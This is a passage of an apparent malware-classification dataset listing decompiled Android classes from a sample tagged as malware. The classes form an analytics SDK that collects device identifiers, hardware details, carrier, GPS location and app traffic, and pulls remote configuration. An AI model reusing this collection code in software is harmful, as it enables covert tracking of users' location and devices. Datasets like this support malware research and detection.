jSONObject) throws Exception {     this.t=jSONObject.has(""app_version"") ? jSONObject.getString(""app_version"") : null;     this.u=jSONObject.has(com.seleuco.common.a.f) ? jSONObject.getString(com.seleuco.common.a.f) : null;     this.v=jSONObject.has(""package_name"") ? jSONObject.getString(""package_name"") : null;   }   private void f(  JSONObject jSONObject) throws Exception {     this.w=jSONObject.getString(""sdk_type"");     this.x=jSONObject.getString(com.seleuco.common.a.h);   }   private void g(  JSONObject jSONObject) throws Exception {     this.y=jSONObject.has(""timezone"") ? jSONObject.getInt(""timezone"") : 8;     this.z=jSONObject.has(""country"") ? jSONObject.getString(""country"") : null;     this.A=jSONObject.has(""language"") ? jSONObject.getString(""language"") : null;   }   private void h(  JSONObject jSONObject) throws Exception {     this.B=jSONObject.has(""access"") ? jSONObject.getString(""access"") : null;     this.C=jSONObject.has(""access_subtype"") ? jSONObject.getString(""access_subtype"") : null;     this.D=jSONObject.has(""carrier"") ? jSONObject.getString(""carrier"") : null;   }   private void i(  JSONObject jSONObject) throws Exception {     this.E=jSONObject.has(""wrapper_type"") ? jSONObject.getString(""wrapper_type"") : null;     this.F=jSONObject.has(""wrapper_version"") ? jSONObject.getString(""wrapper_version"") : null;   }   @Override public void a(  JSONObject jSONObject) throws Exception {     if (jSONObject != null) {       c(jSONObject);       d(jSONObject);       e(jSONObject);       f(jSONObject);       g(jSONObject);       h(jSONObject);       i(jSONObject);     }   }   private void j(  JSONObject jSONObject) throws Exception {     jSONObject.put(com.seleuco.common.a.g,this.a);     jSONObject.put(""device_id"",this.f127c);     jSONObject.put(com.seleuco.common.a.e,this.d);     if (this.b != null) {       jSONObject.put(com.seleuco.common.a.d,this.b);     }     if (this.e != null) {       jSONObject.put(""mc"",this.e);     }     if (this.f > 0) {       jSONObject.put(com.seleuco.analytics.f.H,this.f);     }   }   private void k(  JSONObject jSONObject) throws Exception {     if (this.g != null) {       jSONObject.put(""device_model"",this.g);     }     if (this.h != null) {       jSONObject.put(""os"",this.h);     }     if (this.i != null) {       jSONObject.put(""os_version"",this.i);     }     if (this.j != null) {       jSONObject.put(""resolution"",this.j);     }     if (this.k != null) {       jSONObject.put(""cpu"",this.k);     }     if (this.l != null) {       jSONObject.put(""gpu_vender"",this.l);     }     if (this.m != null) {       jSONObject.put(""gpu_vender"",this.m);     }     if (this.n != null) {       jSONObject.put(""device_board"",this.n);     }     if (this.o != null) {       jSONObject.put(""device_brand"",this.o);     }     if (this.p > 0) {       jSONObject.put(""device_manutime"",this.p);     }     if (this.q != null) {       jSONObject.put(""device_manufacturer"",this.q);     }     if (this.r != null) {       jSONObject.put(""device_manuid"",this.r);     }     if (this.s != null) {       jSONObject.put(""device_name"",this.s);     }   }   private void l(  JSONObject jSONObject) throws Exception {     if (this.t != null) {       jSONObject.put(""app_version"",this.t);     }     if (this.u != null) {       jSONObject.put(com.seleuco.common.a.f,this.u);     }     if (this.v != null) {       jSONObject.put(""package_name"",this.v);     }   }   private void m(  JSONObject jSONObject) throws Exception {     jSONObject.put(""sdk_type"",this.w);     jSONObject.put(com.seleuco.common.a.h,this.x);   }   private void n(  JSONObject jSONObject) throws Exception {     jSONObject.put(""timezone"",this.y);     if (this.z != null) {       jSONObject.put(""country"",this.z);     }     if (this.A != null) {       jSONObject.put(""language"",this.A);     }   }   private void o(  JSONObject jSONObject) throws Exception {     if (this.B != null) {       jSONObject.put(""access"",this.B);     }     if (this.C != null) {       jSONObject.put(""access_subtype"",this.C);     }     if (this.D != null) {       jSONObject.put(""carrier"",this.D);     }   }   private void p(  JSONObject jSONObject) throws Exception {     if (this.E != null) {       jSONObject.put(""wrapper_type"",this.E);     }     if (this.F != null) {       jSONObject.put(""wrapper_version"",this.F);     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     j(jSONObject);     k(jSONObject);     l(jSONObject);     m(jSONObject);     n(jSONObject);     o(jSONObject);     p(jSONObject);   }   @Override public boolean a(){     if (this.a == null) {       Log.e(com.seleuco.analytics.f.q,""missing appkey "");       return false;     }     if (this.f127c == null || this.d == null) {       Log.e(com.seleuco.analytics.f.q,""missing device id"");       return false;     }     return true;   }   public void a(  Context context,  String... strArr){     if (strArr != null && strArr.length == 2) {       this.a=strArr[0];       this.b=strArr[1];     }     if (this.a == null) {       this.a=com.seleuco.common.b.q(context);     }     if (this.b == null) {       this.b=com.seleuco.common.b.u(context);     }     this.f127c=com.seleuco.common.b.g(context);     this.d=com.seleuco.common.b.h(context);     this.e=com.seleuco.common.b.r(context);     SharedPreferences c2=com.seleuco.analytics.i.c(context);     if (c2 != null) {       this.f=c2.getLong(com.seleuco.analytics.f.H,0L);     }   }   public void a(  Context context){     this.g=Build.MODEL;     this.h=""Android"";     this.i=Build.VERSION.RELEASE;     this.j=com.seleuco.common.b.s(context);     this.k=com.seleuco.common.b.a();     this.n=Build.BOARD;     this.o=Build.BRAND;     this.p=Build.TIME;     this.q=Build.MANUFACTURER;     this.r=Build.ID;     this.s=Build.DEVICE;   }   public void b(  Context context){     this.t=com.seleuco.common.b.e(context);     this.u=com.seleuco.common.b.d(context);     this.v=com.seleuco.common.b.v(context);   }   public void c(  Context context){     this.w=""Android"";     this.x=com.seleuco.analytics.f.f135c;   }   public void d(  Context context){     this.y=com.seleuco.common.b.o(context);     String[] p=com.seleuco.common.b.p(context);     this.z=p[0];     this.A=p[1];   }   public void e(  Context context){     String[] k=com.seleuco.common.b.k(context);     this.B=k[0];     this.C=k[1];     this.D=com.seleuco.common.b.t(context);   }   public void b(  Context context,  String... strArr){     a(context,strArr);     a(context);     b(context);     c(context);     d(context);     e(context);   }   public boolean b(){     return (this.a == null || this.f127c == null) ? false : true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\g.code","public interface g {   void a(  JSONObject jSONObject) throws Exception ;   boolean a();   void b(  JSONObject jSONObject) throws Exception ; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\h.code","public class h extends l implements g {   o a;   public h(){   }   public h(  Context context,  String str){     this.e=str;     this.a=o.a(context);   }   public void a(  o oVar){     this.a=oVar;   }   public void c(  JSONObject jSONObject) throws Exception {     if (this.a != null) {       this.a.b(jSONObject);     }   }   public void d(  JSONObject jSONObject) throws Exception {     o oVar=new o();     oVar.a(jSONObject);     if (oVar.a()) {       this.a=oVar;     }   }   @Override public boolean a(){     if (this.a == null && com.seleuco.analytics.f.i) {       Log.c(com.seleuco.analytics.f.q,""missing location info in Launch"");     }     return super.a();   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject != null) {       try {         super.a(jSONObject);         d(jSONObject);       }  catch (      Exception e) {         e.printStackTrace();       }     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     c(jSONObject);     super.b(jSONObject);   }   public JSONObject b(){     JSONObject jSONObject;     Exception e;     try {       jSONObject=new JSONObject();     }  catch (    Exception e2) {       jSONObject=null;       e=e2;     }     try {       b(jSONObject);     }  catch (    Exception e3) {       e=e3;       e.printStackTrace();       return jSONObject;     }     return jSONObject;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\i.code","public class i implements g {   public ArrayList<g> a=new ArrayList<>();   public ArrayList<g> b=new ArrayList<>();   public ArrayList<g> f128c=new ArrayList<>();   public ArrayList<g> d=new ArrayList<>();   public ArrayList<g> e=new ArrayList<>();   private final String f=""launch"";   private final String g=""terminate"";   private final String h=""error"";   private final String i=""event"";   private final String j=""ekv"";   public void a(  h hVar){     if (hVar != null && hVar.a()) {       this.a.add(hVar);     }   }   public void a(  m mVar){     if (mVar != null && mVar.a()) {       this.b.add(mVar);     }   }   public void a(  d dVar){     if (dVar != null && dVar.a()) {       this.f128c.add(dVar);     }   }   public void a(  e eVar){     if (eVar != null && eVar.a()) {       this.d.add(eVar);     }   }   public void a(  String str,  a aVar){     if (aVar != null && aVar.a()) {       Iterator<g> it=this.e.iterator();       while (it.hasNext()) {         b bVar=(b)it.next();         if (bVar.a.equals(str)) {           bVar.b.add(aVar);           return;         }       }       this.e.add(new b(str,aVar));     }   }   public void a(  b bVar){     if (bVar != null && bVar.a()) {       this.e.add(bVar);     }   }   private void c(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(""launch"")) {       JSONArray jSONArray=jSONObject.getJSONArray(""launch"");       for (int i=0; i < jSONArray.length(); i++) {         h hVar=new h();         hVar.a(jSONArray.getJSONObject(i));         a(hVar);       }     }   }   private void d(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(""terminate"")) {       JSONArray jSONArray=jSONObject.getJSONArray(""terminate"");       for (int i=0; i < jSONArray.length(); i++) {         m mVar=new m();         mVar.a(jSONArray.getJSONObject(i));         a(mVar);       }     }   }   private void e(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(""event"")) {       JSONArray jSONArray=jSONObject.getJSONArray(""event"");       for (int i=0; i < jSONArray.length(); i++) {         e eVar=new e();         eVar.a(jSONArray.getJSONObject(i));         a(eVar);       }     }   }   private void f(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(""ekv"")) {       JSONArray jSONArray=jSONObject.getJSONArray(""ekv"");       for (int i=0; i < jSONArray.length(); i++) {         b bVar=new b();         bVar.a(jSONArray.getJSONObject(i));         a(bVar);       }     }   }   private void g(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(""error"")) {       JSONArray jSONArray=jSONObject.getJSONArray(""error"");       for (int i=0; i < jSONArray.length(); i++) {         d dVar=new d();         dVar.a(jSONArray.getJSONObject(i));         a(dVar);       }     }   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject != null) {       try {         c(jSONObject);         d(jSONObject);         e(jSONObject);         f(jSONObject);         g(jSONObject);       }  catch (      Exception e) {         Log.b(com.seleuco.analytics.f.q,""merge log body eror"",e);       }     }   }   private JSONArray a(  ArrayList<g> arrayList){     JSONArray jSONArray;     j jVar;     if (arrayList.size() > 0) {       JSONArray jSONArray2=new JSONArray();       Iterator<g> it=arrayList.iterator();       j jVar2=null;       while (it.hasNext()) {         try {           jVar=new j(this,it.next());         }  catch (        Exception e) {           Log.a(com.seleuco.analytics.f.q,""Fail to write json ..."",e);           jVar=jVar2;         }         if (jVar == null) {           jVar2=jVar;         }  else {           jSONArray2.put(jVar);           jVar2=jVar;         }       }       jSONArray=jSONArray2;     }  else {       jSONArray=null;     }     if (jSONArray == null || jSONArray.length() == 0) {       return null;     }     return jSONArray;   }   @Override public void b(  JSONObject jSONObject) throws Exception {     JSONArray a=a(this.a);     JSONArray a2=a(this.b);     JSONArray a3=a(this.d);     JSONArray a4=a(this.f128c);     JSONArray a5=a(this.e);     if (a != null) {       jSONObject.put(""launch"",a);     }     if (a2 != null) {       jSONObject.put(""terminate"",a2);     }     if (a3 != null) {       jSONObject.put(""event"",a3);     }     if (a4 != null) {       jSONObject.put(""error"",a4);     }     if (a5 != null) {       jSONObject.put(""ekv"",a5);     }   }   @Override public boolean a(){     Iterator<g> it=this.a.iterator();     while (it.hasNext()) {       if (!it.next().a()) {         return false;       }     }     Iterator<g> it2=this.b.iterator();     while (it2.hasNext()) {       if (!it2.next().a()) {         return false;       }     }     Iterator<g> it3=this.d.iterator();     while (it3.hasNext()) {       if (!it3.next().a()) {         return false;       }     }     Iterator<g> it4=this.e.iterator();     while (it4.hasNext()) {       if (!it4.next().a()) {         return false;       }     }     Iterator<g> it5=this.f128c.iterator();     while (it5.hasNext()) {       if (!it5.next().a()) {         return false;       }     }     return (this.a.size() == 0 && this.b.size() == 0 && this.d.size() == 0 && this.e.size() == 0 && this.f128c.size() == 0) ? false : true;   }   public void a(  i iVar){     this.a.addAll(iVar.a);     this.b.addAll(iVar.b);     this.d.addAll(iVar.d);     this.f128c.addAll(iVar.f128c);     b(iVar.e);   }   private void b(  ArrayList<g> arrayList){     if (!arrayList.isEmpty()) {       HashMap hashMap=new HashMap();       Iterator<g> it=arrayList.iterator();       while (it.hasNext()) {         b bVar=(b)it.next();         if (hashMap.containsKey(bVar.a)) {           ((b)hashMap.get(bVar.a)).a(bVar);         }  else {           hashMap.put(bVar.a,bVar);         }       }       Iterator<g> it2=this.e.iterator();       while (it2.hasNext()) {         b bVar2=(b)it2.next();         if (hashMap.containsKey(bVar2.a)) {           ((b)hashMap.get(bVar2.a)).a(bVar2);         }  else {           hashMap.put(bVar2.a,bVar2);         }       }       this.e.clear();       Iterator it3=hashMap.values().iterator();       while (it3.hasNext()) {         this.e.add((b)it3.next());       }     }   }   public int b(){     int i=0;     Iterator<g> it=this.e.iterator();     while (true) {       int i2=i;       if (it.hasNext()) {         i=((b)it.next()).b.size() + i2;       }  else {         return this.a.size() + i2 + this.b.size()+ this.d.size()+ this.f128c.size();       }     }   }   public void c(){     this.a.clear();     this.b.clear();     this.d.clear();     this.e.clear();     this.f128c.clear();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\j.code","class j extends JSONObject {   final g a;   final i b;   public j(  i iVar,  g gVar) throws Exception {     this.b=iVar;     this.a=gVar;     this.a.b(this);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\k.code","public class k {   public String a;   public int b;   public k(){   }   public k(  JSONArray jSONArray) throws Exception {     this.a=jSONArray.getString(0);     this.b=jSONArray.getInt(1);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\l.code","public class l extends n {   public static final String f=""session_id"";   public String e;   public void a(  String str){     this.e=str;   }   @Override public boolean a(){     if (this.e != null) {       return super.a();     }     Log.b(com.seleuco.analytics.f.q,""Session id is not initialized"");     return false;   }   @Override public void b(  JSONObject jSONObject) throws Exception {     super.b(jSONObject);     jSONObject.put(f,this.e);   }   @Override public void a(  JSONObject jSONObject) throws Exception {     super.a(jSONObject);     this.e=jSONObject.getString(f);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\m.code","public class m extends l implements g {   private static final String k=""duration"";   private static final String l=""activities"";   private static final String m=""terminate_time"";   public o a;   public p b;   public long f129c=0;   private ArrayList<k> d=new ArrayList<>();   public m(){   }   public m(  String str){     this.e=str;   }   public static m a(  Context context){     m mVar=null;     SharedPreferences e=com.seleuco.analytics.i.e(context);     String string=e.getString(l.f,null);     if (string != null) {       mVar=new m(string);       o b=o.b(context);       if (b != null && b.a()) {         mVar.a=b;       }       p a=p.a(context);       if (a != null && a.a()) {         mVar.b=a;       }       mVar.d=c(e);       mVar.f129c=d(e);       String[] b2=b(e);       if (b2 != null && b2.length == 2) {         mVar.g=b2[0];         mVar.h=b2[1];       }       a(e);     }     return mVar;   }   private static void a(  SharedPreferences sharedPreferences){     SharedPreferences.Editor edit=sharedPreferences.edit();     edit.putLong(k,0L);     edit.putString(l,"""");     edit.commit();   }   private static String[] b(  SharedPreferences sharedPreferences){     long j=sharedPreferences.getLong(m,0L);     if (j <= 0) {       return null;     }     return com.seleuco.common.b.a(new Date(j)).split("" "");   }   private static ArrayList<k> c(  SharedPreferences sharedPreferences){     String string=sharedPreferences.getString(l,"""");     if (!"""".equals(string)) {       ArrayList<k> arrayList=new ArrayList<>();       try {         String[] split=string.split("";"");         for (        String str : split) {           arrayList.add(new k(new JSONArray(str)));         }       }  catch (      Exception e) {         e.printStackTrace();       }       if (arrayList.size() > 0) {         return arrayList;       }     }     return null;   }   private static long d(  SharedPreferences sharedPreferences){     return sharedPreferences.getLong(k,0L) / 1000;   }   public static SharedPreferences.Editor a(  SharedPreferences sharedPreferences,  String str,  long j,  long j2){     long j3=j2 - j;     long j4=sharedPreferences.getLong(k,0L);     SharedPreferences.Editor edit=sharedPreferences.edit();     if (com.seleuco.analytics.f.j) {       String string=sharedPreferences.getString(l,"""");       if (!"""".equals(string)) {         string=string + "";"";       }       String str2=string + String.format(""[%s,%d]"",str,Long.valueOf(j3 / 1000));       edit.remove(l);       edit.putString(l,str2);     }     edit.putLong(k,j3 + j4);     edit.putLong(m,j2);     edit.commit();     return edit;   }   @Override public boolean a(){     if (this.a == null && com.seleuco.analytics.f.i) {       Log.c(com.seleuco.analytics.f.q,""missing location info in Terminate"");     }     if (this.b == null) {       Log.e(com.seleuco.analytics.f.q,""missing receive and transport Traffic in Terminate "");     }     if (this.f129c <= 0) {       Log.b(com.seleuco.analytics.f.q,""missing Duration info in Terminate"");       return false;     }     if (this.d == null || this.d.size() == 0) {       Log.e(com.seleuco.analytics.f.q,""missing Activities info in Terminate"");     }     return super.a();   }   private void c(  JSONObject jSONObject) throws Exception {     if (this.b != null) {       this.b.b(jSONObject);     }   }   private void d(  JSONObject jSONObject) throws Exception {     if (this.a != null) {       this.a.b(jSONObject);     }   }   private void e(  JSONObject jSONObject) throws Exception {     o oVar=new o();     oVar.a(jSONObject);     if (oVar.a()) {       this.a=oVar;     }   }   private void f(  JSONObject jSONObject) throws Exception {     p pVar=new p();     pVar.a(jSONObject);     if (pVar.a()) {       this.b=pVar;     }   }   private void g(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(l)) {       JSONArray jSONArray=jSONObject.getJSONArray(l);       for (int i=0; i < jSONArray.length(); i++) {         this.d.add(new k(jSONArray.getJSONArray(i)));       }     }   }   private void h(  JSONObject jSONObject) throws Exception {     if (this.d.size() != 0) {       JSONArray jSONArray=new JSONArray();       Iterator<k> it=this.d.iterator();       while (it.hasNext()) {         k next=it.next();         JSONArray jSONArray2=new JSONArray();         jSONArray2.put(next.a);         jSONArray2.put(next.b);         jSONArray.put(jSONArray2);       }       jSONObject.put(l,jSONArray);     }   }   @Override public void a(  JSONObject jSONObject){     try {       super.a(jSONObject);       this.f129c=jSONObject.getLong(k);       f(jSONObject);       e(jSONObject);       g(jSONObject);     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     super.b(jSONObject);     if (this.f129c > 0) {       jSONObject.put(k,this.f129c);     }     c(jSONObject);     d(jSONObject);     h(jSONObject);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\n.code","public class n {   public String g;   public String h;   protected final String i=""date"";   protected final String j=""time"";   public n(){     String a=com.seleuco.common.util.g.a();     this.g=a.split("" "")[0];     this.h=a.split("" "")[1];   }   public boolean a(){     if (this.g != null && this.h != null) {       return true;     }     Log.b(com.seleuco.analytics.f.q,""Date or Time is not initialized"");     return false;   }   public void b(  JSONObject jSONObject) throws Exception {     jSONObject.put(""date"",this.g);     jSONObject.put(""time"",this.h);   }   public void a(  JSONObject jSONObject) throws Exception {     this.g=jSONObject.getString(""date"");     this.h=jSONObject.getString(""time"");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\o.code","public final class o implements g {   public static final String d=""lng"";   public static final String e=""lat"";   public static final String f=""gps_time"";   private static final String g=""last_gps_change_time"";   public double a;   public double b;   public long f130c;   public o(){   }   public o(  Location location){     if (location != null) {       this.a=location.getLongitude();       this.b=location.getLatitude();       this.f130c=location.getTime();     }   }   public static o a(  Context context){     if (!com.seleuco.analytics.f.i) {       return null;     }     SharedPreferences e2=com.seleuco.analytics.i.e(context);     Location m=com.seleuco.common.b.m(context);     if (a(m,e2)) {       return new o(m);     }     return null;   }   public static o b(  Context context){     if (!com.seleuco.analytics.f.i) {       return null;     }     SharedPreferences e2=com.seleuco.analytics.i.e(context);     o oVar=new o();     if (!e2.contains(f)) {       return null;     }     oVar.b=e2.getFloat(e,0.0f);     oVar.a=e2.getFloat(d,0.0f);     oVar.f130c=e2.getLong(f,0L);     e2.edit().remove(f).commit();     return oVar;   }   public static SharedPreferences.Editor a(  Context context,  SharedPreferences sharedPreferences){     if (!com.seleuco.analytics.f.i) {       return null;     }     Location m=com.seleuco.common.b.m(context);     if (!a(m,sharedPreferences)) {       return null;     }     SharedPreferences.Editor edit=sharedPreferences.edit();     edit.putFloat(d,(float)m.getLongitude());     edit.putFloat(e,(float)m.getLatitude());     edit.putLong(f,m.getTime());     edit.commit();     return edit;   }   static boolean a(  Location location,  SharedPreferences sharedPreferences){     if (location == null || location.getTime() <= sharedPreferences.getLong(g,0L)) {       return false;     }     sharedPreferences.edit().putLong(g,location.getTime()).commit();     return true;   }   @Override public void b(  JSONObject jSONObject) throws Exception {     jSONObject.put(d,this.a);     jSONObject.put(e,this.b);     jSONObject.put(f,this.f130c);   }   @Override public void a(  JSONObject jSONObject) throws JSONException {     if (jSONObject != null) {       if (jSONObject.has(d)) {         this.a=jSONObject.getDouble(d);       }       if (jSONObject.has(e)) {         this.b=jSONObject.getDouble(e);       }       if (jSONObject.has(f)) {         this.f130c=jSONObject.getLong(f);       }     }   }   @Override public boolean a(){     return (this.a == 0.0d && this.b == 0.0d && this.f130c == 0) ? false : true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.a\p.code","public class p implements g {   private static final String f131c=""uptr"";   private static final String d=""dntr"";   public long a=0;   public long b=0;   @Override public void a(  JSONObject jSONObject) throws Exception {     if (jSONObject != null) {       if (jSONObject.has(f131c)) {         this.a=jSONObject.getLong(f131c);       }       if (jSONObject.has(d)) {         this.b=jSONObject.getLong(d);       }     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     if (this.a > 0) {       jSONObject.put(f131c,this.a);     }     if (this.b > 0) {       jSONObject.put(d,this.b);     }   }   @Override public boolean a(){     return this.a > 0 && this.b > 0;   }   public static p a(  Context context){     try {       p pVar=new p();       long[] b=b(context);       if (b[0] <= 0 || b[1] <= 0) {         return null;       }       SharedPreferences e=com.seleuco.analytics.i.e(context);       long j=e.getLong(f131c,-1L);       long j2=e.getLong(d,-1L);       e.edit().putLong(f131c,b[1]).putLong(d,b[0]).commit();       if (j <= 0 || j2 <= 0) {         return null;       }       b[0]=b[0] - j2;       b[1]=b[1] - j;       if (b[0] <= 0 || b[1] <= 0) {         return null;       }       pVar.b=b[0];       pVar.a=b[1];       return pVar;     }  catch (    Exception e2) {       Log.e(com.seleuco.analytics.f.q,""sdk less than 2.2 has get no traffic"");       return null;     }   }   private static long[] b(  Context context) throws Exception {     Class<?> cls=Class.forName(""android.net.TrafficStats"");     Method method=cls.getMethod(""getUidRxBytes"",Integer.TYPE);     Method method2=cls.getMethod(""getUidTxBytes"",Integer.TYPE);     int i=context.getApplicationInfo().uid;     if (i == -1) {       return null;     }     return new long[]{((Long)method.invoke(null,Integer.valueOf(i))).longValue(),((Long)method2.invoke(null,Integer.valueOf(i))).longValue()};   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.onlineconfig\a.code","public class a {   private final String a=""last_config_time"";   private final String b=""report_policy"";   private final String f138c=""online_config"";   private String d=null;   private String e=null;   private SeleucoConfigureListener f=null;   private c g=null;   public void a(  Context context){     try {       if (context == null) {         Log.b(f.q,""unexpected null context in updateOnlineConfig"");       }  else {         new Thread(new b(context)).start();       }     }  catch (    Exception e) {       Log.b(f.q,""exception in updateOnlineConfig"");     }   }   public void a(  Context context,  String str,  String str2){     this.d=str;     this.e=str2;     a(context);   }   public void a(  SeleucoConfigureListener seleucoConfigureListener){     this.f=seleucoConfigureListener;   }   public void a(){     this.f=null;   }   public void a(  c cVar){     this.g=cVar;   }   public void b(){     this.g=null;   }   public void a(  JSONObject jSONObject){     if (this.f != null) {       this.f.onDataReceived(jSONObject);     }   }   private String b(  Context context) throws Exception {     String str=this.d;     if (str == null) {       str=com.seleuco.common.b.q(context);     }     if (str == null) {       throw new Exception(""none appkey exception"");     }     return str;   }   private String c(  Context context){     return this.e == null ? com.seleuco.common.b.u(context) : this.e;   }   public JSONObject d(  Context context){     JSONObject jSONObject=new JSONObject();     try {       getClass();       jSONObject.put(com.seleuco.common.a.b,""online_config"");       jSONObject.put(com.seleuco.common.a.g,b(context));       jSONObject.put(com.seleuco.common.a.f,com.seleuco.common.b.d(context));       jSONObject.put(com.seleuco.common.a.f140c,com.seleuco.common.b.v(context));       jSONObject.put(com.seleuco.common.a.h,""4.6.1"");       jSONObject.put(com.seleuco.common.a.e,g.b(com.seleuco.common.b.g(context)));       jSONObject.put(com.seleuco.common.a.d,c(context));       jSONObject.put(""report_policy"",i.i(context)[0]);       jSONObject.put(""last_config_time"",e(context));       return jSONObject;     }  catch (    Exception e) {       Log.b(f.q,""exception in onlineConfigInternal"");       return null;     }   }   private String e(  Context context){     return i.b(context).getString(f.C,"""");   }   public void a(  Context context,  com.seleuco.analytics.onlineconfig.b bVar){     SharedPreferences.Editor edit=i.b(context).edit();     if (!TextUtils.isEmpty(bVar.e)) {       edit.putString(f.C,bVar.e);     }     if (bVar.f139c != -1) {       edit.putInt(f.A,bVar.f139c);       edit.putLong(f.B,bVar.d);     }     edit.commit();   }   public void b(  Context context,  com.seleuco.analytics.onlineconfig.b bVar){     if (bVar.a != null && bVar.a.length() != 0) {       SharedPreferences.Editor edit=i.b(context).edit();       try {         JSONObject jSONObject=bVar.a;         Iterator<String> keys=jSONObject.keys();         while (keys.hasNext()) {           String next=keys.next();           edit.putString(next,jSONObject.getString(next));         }         edit.commit();         Log.a(f.q,""get online setting params: "" + jSONObject);       }  catch (      Exception e) {         Log.c(f.q,""save online config params"",e);       }     }   } public class b extends r implements Runnable {     Context a;     public b(    Context context){       this.a=context.getApplicationContext();     }     @Override public void run(){       try {         b();       }  catch (      Exception e) {         a.this.a((JSONObject)null);         Log.c(f.q,""reques update error"",e);       }     }     @Override public boolean a(){       return false;     }     private void b(){       C0000a c0000a=new C0000a(a.this.d(this.a));       com.seleuco.analytics.onlineconfig.b bVar=null;       for (      String str : f.s) {         c0000a.a(str);         bVar=(com.seleuco.analytics.onlineconfig.b)a(c0000a,com.seleuco.analytics.onlineconfig.b.class);         if (bVar != null) {           break;         }       }       if (bVar == null) {         a.this.a((JSONObject)null);         return;       }       Log.a(f.q,""response : "" + bVar.b);       if (bVar.b) {         if (a.this.g != null) {           a.this.g.a(bVar.f139c,bVar.d);         }         a.this.a(this.a,bVar);         a.this.b(this.a,bVar);         a.this.a(bVar.a);         return;       }       a.this.a((JSONObject)null);     }   } public class C0000a extends s {     private JSONObject e;     public C0000a(    JSONObject jSONObject){       super(null);       this.e=jSONObject;     }     @Override public JSONObject a(){       return this.e;     }     @Override public String b(){       return this.d;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.onlineconfig\b.code","public class b extends r implements Runnable {   Context a;   public b(  Context context){     this.a=context.getApplicationContext();   }   @Override public void run(){     try {       b();     }  catch (    Exception e) {       a.this.a((JSONObject)null);       Log.c(f.q,""reques update error"",e);     }   }   @Override public boolean a(){     return false;   }   private void b(){     C0000a c0000a=new C0000a(a.this.d(this.a));     com.seleuco.analytics.onlineconfig.b bVar=null;     for (    String str : f.s) {       c0000a.a(str);       bVar=(com.seleuco.analytics.onlineconfig.b)a(c0000a,com.seleuco.analytics.onlineconfig.b.class);       if (bVar != null) {         break;       }     }     if (bVar == null) {       a.this.a((JSONObject)null);       return;     }     Log.a(f.q,""response : "" + bVar.b);     if (bVar.b) {       if (a.this.g != null) {         a.this.g.a(bVar.f139c,bVar.d);       }       a.this.a(this.a,bVar);       a.this.b(this.a,bVar);       a.this.a(bVar.a);       return;     }     a.this.a((JSONObject)null);   } } public class b extends t {   public JSONObject a;   boolean b;   int f139c;   int d;   String e;   private final String f;   private final String g;   private final String h;   private final String i;   private final String j;   public b(  JSONObject jSONObject){     super(jSONObject);     this.a=null;     this.b=false;     this.f139c=-1;     this.d=-1;     this.f=""config_update"";     this.g=""report_policy"";     this.h=""online_params"";     this.i=""last_config_time"";     this.j=f.G;     if (jSONObject != null) {       a(jSONObject);       a();     }   }   private void a(  JSONObject jSONObject){     try {       if (jSONObject.has(""config_update"") && !jSONObject.getString(""config_update"").toLowerCase().equals(""no"")) {         if (jSONObject.has(""report_policy"")) {           this.f139c=jSONObject.getInt(""report_policy"");           this.d=jSONObject.optInt(f.G) * 1000;           this.e=jSONObject.optString(""last_config_time"");         }  else {           Log.e(f.q,"" online config fetch no report policy"");         }         this.a=jSONObject.optJSONObject(""online_params"");         this.b=true;       }     }  catch (    Exception e) {       Log.e(f.q,""fail to parce online config response"",e);     }   }   private void a(){     if (this.f139c < 0 || this.f139c > 6) {       this.f139c=1;     }     if (this.f139c == 6 && this.d <= 0) {       this.d=f.h;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.onlineconfig\c.code","public interface c {   void a(  int i,  long j); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics.onlineconfig\C0000a.code","public class C0000a extends s {   private JSONObject e;   public C0000a(  JSONObject jSONObject){     super(null);     this.e=jSONObject;   }   @Override public JSONObject a(){     return this.e;   }   @Override public String b(){     return this.d;   } } "
